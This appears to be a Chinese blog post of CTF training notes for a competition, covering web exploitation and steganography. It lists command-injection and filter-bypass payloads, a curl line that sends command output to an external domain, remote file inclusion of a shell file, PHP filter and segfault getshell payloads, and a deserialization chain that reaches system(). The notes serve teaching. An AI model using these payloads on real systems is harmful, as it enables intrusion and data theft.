@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.xingxiaowu.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="WEB信息收集、爆破、认证1.敏感文件泄露 a.robots.txt b.www.zip c.&#x2F;.git  2.dirsearch\dirb\3.BURP a.登录框-&gt;admin密码【登录获取flag】 b.给一个字典，爆出普通用户密码，登录后，有些权限验证方法 c.Cookie-&gt;user改为admin d.JWT验证 i.修改算法 ii.算法改为None，none ii">
+<meta property="og:type" content="article">
+<meta property="og:title" content="赣银杯赛前培训">
+<meta property="og:url" content="http://blog.xingxiaowu.cn/2025/06/14/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD2025/index.html">
+<meta property="og:site_name" content="无星的小窝">
+<meta property="og:description" content="WEB信息收集、爆破、认证1.敏感文件泄露 a.robots.txt b.www.zip c.&#x2F;.git  2.dirsearch\dirb\3.BURP a.登录框-&gt;admin密码【登录获取flag】 b.给一个字典，爆出普通用户密码，登录后，有些权限验证方法 c.Cookie-&gt;user改为admin d.JWT验证 i.修改算法 ii.算法改为None，none ii">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%B5%A3%E9%93%B62025/20250614112820507.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%B5%A3%E9%93%B62025/20250614112907988.png">
+<meta property="article:published_time" content="2025-06-14T12:17:00.000Z">
+<meta property="article:modified_time" content="2025-10-15T14:34:21.797Z">
+<meta property="article:author" content="无星">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%B5%A3%E9%93%B62025/20250614112820507.png">
+
+<link rel="canonical" href="http://blog.xingxiaowu.cn/2025/06/14/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD2025/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>赣银杯赛前培训 | 无星的小窝</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-5976024V60"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-5976024V60');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?bdba6c3bda62a07f58f3cf06034704d5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/rss2.xml" title="无星的小窝" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <span id="forkongithub"><a target="_blank" rel="noopener" href="https://github.com/XingXiaoWu">我的GitHub</a></span>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">无星的小窝</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">技术为辅,业务为主</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-留言板">
+
+    <a href="/guestbook" rel="section"><i class="fab fa-leanpub fa-fw"></i>留言板</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/html/404.html" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.xingxiaowu.cn/2025/06/14/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD2025/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/headerPic.png">
+      <meta itemprop="name" content="无星">
+      <meta itemprop="description" content="一个么的前途的弟中弟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="无星的小窝">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          赣银杯赛前培训
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-06-14 20:17:00" itemprop="dateCreated datePublished" datetime="2025-06-14T20:17:00+08:00">2025-06-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-10-15 22:34:21" itemprop="dateModified" datetime="2025-10-15T22:34:21+08:00">2025-10-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2025/06/14/CTF/%E8%B5%A3%E9%93%B6%E6%9D%AF%E5%9F%B9%E8%AE%AD2025/" class="post-meta-item leancloud_visitors" data-flag-title="赣银杯赛前培训" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="信息收集、爆破、认证"><a href="#信息收集、爆破、认证" class="headerlink" title="信息收集、爆破、认证"></a>信息收集、爆破、认证</h2><h3 id="1-敏感文件泄露"><a href="#1-敏感文件泄露" class="headerlink" title="1.敏感文件泄露"></a>1.敏感文件泄露</h3><ul>
+<li>a.robots.txt</li>
+<li>b.<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></li>
+<li>c.&#x2F;.git</li>
+</ul>
+<h3 id="2-dirsearch-dirb"><a href="#2-dirsearch-dirb" class="headerlink" title="2.dirsearch\dirb\"></a>2.dirsearch\dirb\</h3><h3 id="3-BURP"><a href="#3-BURP" class="headerlink" title="3.BURP"></a>3.BURP</h3><ul>
+<li>a.登录框-&gt;admin密码【登录获取flag】</li>
+<li>b.给一个字典，爆出普通用户密码，登录后，有些权限验证方法</li>
+<li>c.Cookie-&gt;user改为admin</li>
+<li>d.JWT验证</li>
+<li>i.修改算法</li>
+<li>ii.算法改为None，none</li>
+<li>iii.爆破密钥</li>
+<li>iv.删除signature，删除签名</li>
+</ul>
+<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p><img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%B5%A3%E9%93%B62025/20250614112820507.png"></p>
+<h3 id="1-成因"><a href="#1-成因" class="headerlink" title="1.成因"></a>1.成因</h3><ul>
+<li>a.system(‘ping -c xxx $ip’)</li>
+<li>b.ping -c 4 192.168.0.1</li>
+<li>c.ping -c 4 asdasd| whoami</li>
+</ul>
+<h3 id="2-分隔符"><a href="#2-分隔符" class="headerlink" title="2.分隔符"></a>2.分隔符</h3><ul>
+<li>a.| &amp;<ul>
+<li>i.前一条执行结果当作下一条命令的参数   cat xxx | grep xxx</li>
+<li>ii.前一条挂后台执行，直接执行下一条    ping -c 20 127.0.0.1 &amp; ls</li>
+<li>iii.[+] PID</li>
+<li>iv.ls执行结果输出</li>
+<li>v.xxxx  ttl&#x3D;xxxx</li>
+</ul>
+</li>
+<li>b.||  &amp;&amp;<ul>
+<li>i.||     前一条执行失败则执行下一条   ping -c 4 asdadasd || ls</li>
+<li>ii.&amp;&amp;   前一条执行成功则执行下一条   ping -c 4 127.0.0.1 &amp;&amp; ls</li>
+</ul>
+</li>
+<li>c.&gt;&lt;<ul>
+<li>i.&gt;将标准输出流重定向到指定位置</li>
+<li>ii.&lt;将标准输入流重定向到指定位置</li>
+<li>iii.nc   -lnvp 7777 &gt; 1.txt   【起一个监听，将监听到的内容输出到某个文件中】</li>
+<li>iv.nc   127.0.0.1   7777 &lt; 2.txt 【连接到127.0.0.1:7777并将2.txt文本作为输入】</li>
+<li>v.0   1   2<ul>
+<li>1.标准输入流        ls   whoami     pwd</li>
+<li>2.标准输出流        执行结果、信息一般是标准输出流</li>
+<li>3.标准错误流        ping -c 4 asdasdasd   &gt;  2.txt</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>d.; %0a<ul>
+<li>i.都是标识命令的结束符，ls;pwd;whoami</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-读文件"><a href="#3-读文件" class="headerlink" title="3.读文件"></a>3.读文件</h3><ul>
+<li>a.cat &#x2F;flag</li>
+<li>b.head tail<ul>
+<li>i.head -n 20 &#x2F;flag   读文件头20行</li>
+<li>ii.tail -n 20 &#x2F;flag    从文件尾部读取20行</li>
+</ul>
+</li>
+<li>c.less more<ul>
+<li>i.分页读取文件</li>
+</ul>
+</li>
+<li>d.paste strings<ul>
+<li>i.paste  file1 file2</li>
+</ul>
+</li>
+<li>e.base64<ul>
+<li>i.base64 &#x2F;flag</li>
+<li>ii.base64 &#x2F;etc&#x2F;passwd | base64 -d 解码base64内容</li>
+</ul>
+</li>
+<li>f.diff file1 file2</li>
+<li>g.xxd  -</li>
+</ul>
+<h3 id="4-绕过过滤"><a href="#4-绕过过滤" class="headerlink" title="4.绕过过滤"></a>4.绕过过滤</h3><ul>
+<li>a.ca’’t &#x2F;fl’’ag</li>
+<li>b.x&#x3D;ag;cat fl$x;</li>
+<li>c.x&#x3D;fl;y&#x3D;ag;cat ${fl}${ag}    cat ${x}ag</li>
+<li>d.&#x2F;???&#x2F;????64 &#x2F;????123    【&#x2F;bin&#x2F;base64 &#x2F;flag123】</li>
+<li>e.cat &#x2F;fl??   cat &#x2F;f*   【cat &#x2F;flag】</li>
+<li>f.c\a\t &#x2F;f\la\g</li>
+<li>g..&#x2F;assdasd&#x2F;asdasda&#x2F;asdasdasd&#x2F;asdassdasd&#x2F;asdad&#x2F;flag<ul>
+<li>i.长度限制15字符</li>
+<li>ii.grep -r “flag”   【循环遍历当前目录下所有目录及文件找到flag】</li>
+</ul>
+</li>
+</ul>
+<h3 id="5-空格过滤"><a href="#5-空格过滤" class="headerlink" title="5.空格过滤"></a>5.空格过滤</h3><ul>
+<li>a.%0b   垂直换行符</li>
+<li>b.%0c   换页符</li>
+<li>c.%09   制表符</li>
+<li>d.%a0   硬空格</li>
+<li>e.%20   普通空格</li>
+<li>f.${IFS}    cat${IFS}&#x2F;flag    cat$IFS$7flag</li>
+</ul>
+<h3 id="6-无回显"><a href="#6-无回显" class="headerlink" title="6.无回显"></a>6.无回显</h3><ul>
+<li>a.cat &#x2F;flag &gt; 1.txt   【&#x2F;var&#x2F;www&#x2F;html】  直接访问1.txt</li>
+<li>b.curl http:&#x2F;&#x2F;外部域名?cmd&#x3D;<code>ls|base64</code>   【burp collaborator生成域名】</li>
+</ul>
+<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h3 id="1-原因"><a href="#1-原因" class="headerlink" title="1.原因"></a>1.原因</h3><ul>
+<li>a.eval($_GET[1])</li>
+<li>b.将用户输入的内容当成PHP代码进行解析</li>
+</ul>
+<h3 id="2-利用"><a href="#2-利用" class="headerlink" title="2.利用"></a>2.利用</h3><ul>
+<li>a.phpinfo();</li>
+<li>b.system(‘ls’);</li>
+</ul>
+<h3 id="3-一些过滤"><a href="#3-一些过滤" class="headerlink" title="3.一些过滤"></a>3.一些过滤</h3><ul>
+<li>a.只能用特殊符号但是不能用数字字母   【取反命令执行】<ul>
+<li>i.~phpinfo;  【取反】</li>
+<li>ii.urlencode(~”phpinfo”);  【取反后url编码】</li>
+<li>iii.~urldecode(“取反并编码后的内容”)();</li>
+</ul>
+</li>
+<li>b.异或命令执行<ul>
+<li>i. <img src="https://cdn.jsdelivr.net/gh/XingXiaoWu/XingXiaoWu.github.io@pic/%E8%B5%A3%E9%93%B62025/20250614112907988.png"></li>
+</ul>
+</li>
+</ul>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h3 id="1-本地文件包含-etc-passwd-etc-mysql-my-cnf-【读取配置文件查看服务配置信息】"><a href="#1-本地文件包含-etc-passwd-etc-mysql-my-cnf-【读取配置文件查看服务配置信息】" class="headerlink" title="1.本地文件包含   &#x2F;etc&#x2F;passwd     &#x2F;etc&#x2F;mysql&#x2F;my.cnf   【读取配置文件查看服务配置信息】"></a>1.本地文件包含   &#x2F;etc&#x2F;passwd     &#x2F;etc&#x2F;mysql&#x2F;my.cnf   【读取配置文件查看服务配置信息】</h3><h3 id="2-远程文件包含-http-恶意域名-shell-txt-【包含远程恶意文件】"><a href="#2-远程文件包含-http-恶意域名-shell-txt-【包含远程恶意文件】" class="headerlink" title="2.远程文件包含    http:&#x2F;&#x2F;恶意域名&#x2F;shell.txt     【包含远程恶意文件】"></a>2.远程文件包含    http:&#x2F;&#x2F;恶意域名&#x2F;shell.txt     【包含远程恶意文件】</h3><h3 id="3-伪协议"><a href="#3-伪协议" class="headerlink" title="3.伪协议"></a>3.伪协议</h3><ul>
+<li>a.php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxxx.php</li>
+<li>b.php:&#x2F;&#x2F;data&#x2F;text&#x2F;plain,<?php phpinfo?></li>
+<li>c.data:&#x2F;&#x2F;text&#x2F;plain,直接输入文本信息    file_get_contents($_GET[1])</li>
+<li>d.1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,hello world </li>
+<li>e.data:,<?php phpinfo()?></li>
+</ul>
+<h3 id="4-SESSION文件包含"><a href="#4-SESSION文件包含" class="headerlink" title="4.SESSION文件包含"></a>4.SESSION文件包含</h3><ul>
+<li>a.&gt;<a target="_blank" rel="noopener" href="https://www.codenong.com/cs106498971/">https://www.codenong.com/cs106498971/</a></li>
+<li>b.&#x2F;tmp&#x2F;sess_xxxxxxx   上传文件，upload_progress   并手动定义了PHPSESID</li>
+<li>c.上传文件的内容就会临时包含在&#x2F;tmp&#x2F;sess_xxxxxx   ，如果此时包含该sess文件并且上传的文件中有php代码，那么就会导致代码执行</li>
+</ul>
+<h3 id="5-PHP7-segment-fault"><a href="#5-PHP7-segment-fault" class="headerlink" title="5.PHP7 segment fault"></a>5.PHP7 segment fault</h3><ul>
+<li>a.</li>
+<li>b.   段错误（segment fault）就是指访问的内存超过了系统所给这个程序的内存空间。从而发生程序退出。缓存文件就留在了tmp目录</li>
+<li>c.    向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</li>
+<li>d.</li>
+<li>e.    php代码中使用<code>php://filter的strip_tags</code> 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。</li>
+<li>f.</li>
+<li>g.    php&lt;7.2版本用如下payload：</li>
+<li>h.</li>
+<li>i.    <code>http://192.33.6.145/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd</code></li>
+<li>j.</li>
+<li>k.    php7老版本通杀：</li>
+<li>l.</li>
+<li>m.    <code>php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></li>
+<li>n.</li>
+<li>o.    这种 包含 会导致php执行过程中出现segment fault，此时 上传文件，临时文件会被保存在<code>upload_tmp_dir</code>所指定的目录下，不会被删除，这样就能达成getshell的目的。</li>
+</ul>
+<h3 id="6-日志包含"><a href="#6-日志包含" class="headerlink" title="6.日志包含"></a>6.日志包含</h3><ul>
+<li>a.&#x2F;var&#x2F;log&#x2F;access.log</li>
+<li>b.&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</li>
+<li>c.&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</li>
+<li>d.mysql日志</li>
+<li>e.ssh日志</li>
+</ul>
+<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h3 id="1-序列化"><a href="#1-序列化" class="headerlink" title="1.序列化"></a>1.序列化</h3><ul>
+<li>a.原本的数据格式不适合直接传输存储</li>
+<li>b.经过一系列规则转化为固定格式的字符串进行保存</li>
+<li>c.serialize</li>
+<li>d.b:1</li>
+<li>i:12</li>
+<li>s:5:”name1”</li>
+<li>array(“a”&#x3D;&gt;”111”,”b”&#x3D;&gt;123);</li>
+<li>a:2:{s:1:”a”;s:3:”111”;s:1:”b”;i:123;}</li>
+<li>O:4:”user”:2:{s:4:”name”;s:8:”zhangsan”;* s:2:”id”;s:3:”007”;}</li>
+</ul>
+<h3 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h3><ul>
+<li>a.经过规则将固定格式的字符串还原为原先的数据格式</li>
+<li>b.unserialize(序列化后的字符串)</li>
+<li>c.魔术方法<ul>
+<li>i.phpinfo();</li>
+<li>ii.user-&gt;hello();</li>
+<li>iii.魔术方法：满足一定条件，自动触发  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__construct： 在创建对象时候初始化对象，一般用      于对变量赋初值。</span><br><span class="line">__destruct： 和构造函数相反，当对象所在函数调用     完毕后执行。</span><br><span class="line">__toString：当对象被当做一个字符串使用时调用。</span><br><span class="line">__sleep:序列化对象之前就调用此方法(其返回需要一     个数组)</span><br><span class="line">__wakeup:将在反序列化之后立即被调用，反序列化恢     复对象之前调用该方法</span><br><span class="line">__call:当调用对象中不存在的方法会自动调用该方       法。</span><br><span class="line">__get:在调用私有属性的时候会自动执行</span><br><span class="line">__isset()在不可访问的属性上调用isset()或empty       ()触发</span><br><span class="line">__unset()在不可访问的属性上使用unset()时触发</span><br><span class="line">__invoke() 将对象当作函数来使用的时候，会自动调     用该方法，用“unset()”函数删除对象内部的私有成员     属性时，对象会自动调用__unset()函数来帮我们删除    对象内部的私有成员属性。</span><br><span class="line">    __get()如果试图读取一个对象并不存在的属性的     时候，PHP就会给出错误信息。如果在类里添加       __get方法，并且我们可以用这个函数实现类似      java中反射的各种操作。</span><br></pre></td></tr></table></figure></li>
+<li>iv.   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">class cat&#123;</span><br><span class="line">public paw;</span><br><span class="line">public name;</span><br><span class="line"></span><br><span class="line">function bark()&#123;</span><br><span class="line">  echo &quot;meow&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line"></span><br><span class="line">    echo $this-&gt;name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __toString()&#123;</span><br><span class="line"></span><br><span class="line">  $a=$this-&gt;paw;</span><br><span class="line">  $a();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __invoke()&#123;</span><br><span class="line"></span><br><span class="line">    eval($this-&gt;name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$x=new cat;</span><br><span class="line">$x-&gt;name= new cat;</span><br><span class="line">$x-&gt;name-&gt;paw= new cat;</span><br><span class="line">$x-&gt;name-&gt;paw-&gt;name=&quot;system(&#x27;ls&#x27;);&quot;;</span><br><span class="line"></span><br><span class="line">echo urlecode(serialize($x));</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="随波逐流"><a href="#随波逐流" class="headerlink" title="随波逐流"></a>随波逐流</h3><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>16  hex  ecode</p>
+<p>base64</p>
+<p>base32</p>
+<p>base家族其他编码</p>
+<p>凯撒<br>栅栏<br>维吉尼亚 </p>
+<p>猪圈<br>键盘<br>敲击码 </p>
+<p>space编程<br>社会主义核心价值观编码<br>佛曰 </p>
+<p>各种各样的编码 </p>
+<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><h3 id="1-jpg"><a href="#1-jpg" class="headerlink" title="1.jpg"></a>1.jpg</h3><ul>
+<li>a.F5</li>
+<li>b.jsteg隐写</li>
+</ul>
+<h3 id="2-png"><a href="#2-png" class="headerlink" title="2.png"></a>2.png</h3><ul>
+<li>a.IHDR   IDAT   IEND   </li>
+<li>b.IHDR隐藏信息</li>
+<li>c.IDAT图片数据块的覆盖，需要上下移动数据块显示对应内容</li>
+<li>d.会有个别数据块大小突兀，删除其他数据块显示真实数据</li>
+<li>e.文件末尾提取</li>
+<li>f.LSB隐写<ul>
+<li>i.255,255,255    0xFFFFFF</li>
+<li>ii.0101010110101</li>
+<li>iii.stegsolve</li>
+</ul>
+</li>
+<li>g.zsteg -a xxx.png</li>
+<li>h.exiftools<ul>
+<li>i.stegsolve   </li>
+<li>i.</li>
+<li>ii.发现图像各个通道平移了，用这个模块移动回去</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-gif"><a href="#3-gif" class="headerlink" title="3.gif"></a>3.gif</h3><pre><code>* a.stegsolve frame browser
+</code></pre>
+<h3 id="4-其他工具"><a href="#4-其他工具" class="headerlink" title="4.其他工具"></a>4.其他工具</h3><pre><code>* a.steghide   加密码隐写
+* b.silenteye   加密隐写
+</code></pre>
+<h2 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h2><h3 id="1-audacity"><a href="#1-audacity" class="headerlink" title="1.audacity"></a>1.audacity</h3><ul>
+<li>a.波形图隐写<ul>
+<li>i.摩斯电码   010110，低高低高高低</li>
+</ul>
+</li>
+<li>b.频谱图隐写<ul>
+<li>i.查看声道频谱图发现画出的flag</li>
+<li>ii.更新最新的audacity</li>
+</ul>
+</li>
+</ul>
+<h2 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h2><h3 id="1-potplayer"><a href="#1-potplayer" class="headerlink" title="1.potplayer"></a>1.potplayer</h3><ul>
+<li>a.逐帧查看视频，某些关键帧隐藏了flag内容或者提示信息</li>
+<li>b.闪烁：黑白黑白，类似gif，二进制信息，01010000，提取之后用其他编码手段还原信息</li>
+</ul>
+<h3 id="2-其他"><a href="#2-其他" class="headerlink" title="2.其他"></a>2.其他</h3><ul>
+<li>a.视频也会隐藏描述信息，010editor能够看到</li>
+</ul>
